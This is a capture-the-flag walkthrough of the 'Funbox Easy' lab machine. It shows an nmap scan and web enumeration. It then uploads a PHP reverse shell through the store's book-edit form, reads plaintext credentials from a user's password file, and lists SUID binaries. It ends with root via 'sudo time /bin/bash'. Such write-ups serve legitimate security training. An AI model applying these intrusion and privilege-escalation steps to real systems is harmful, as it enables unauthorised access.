# Funbox

## Nmap scan

```shell
$ nmap -sV -sC -p- --min-rate=10000 funboxeasy
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-09 13:53 EDT
Nmap scan report for funboxeasy (192.168.138.111)
Host is up (0.066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds
```

## Enumeration

### Gym

http://easy/gym/img/PROJECT%20REPORT(1)%20(1).pdf -> Source code and database information here

### Store

http://easy/store/database/www_project.sql -> Found admin's credentials here

http://easy/store/admin.php -> Admin login page here

http://easy/store/admin_add.php -> File upload functionality here

http://easy/store/admin_edit.php?bookisbn=978-1-49192-706-9 -> Changing the book file to `php-rev-shell.php` here... Make sure to set the right publisher_id to successfully add a new book, refer to the database.

![](png/vulnhub_funboxeasy.png)

## Exploitation

After uploading the book, start a listener and go to http://easy/store/index.php to catch the shell.

```shell
$ cat /home/tony/password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

`gym/admin` credentials work here -> http://easy/admin/home.php

SSH using tony's credentials

## Privilege Escalaltion

```shell
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 23K Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 463K May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 128K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 39K Apr  2  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 163K Feb  3  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 15K Apr 21  2017 /usr/bin/time # <-- Highlighted
```

```shell
tony@3:~$ sudo -l
Matching Defaults entries for tony on 3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on 3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

[time - GTFOBins](https://gtfobins.github.io/gtfobins/time/#sudo)

```shell
tony@3:~$ sudo time /bin/bash
root@3:/home/tony# cat /root/proof.txt
```
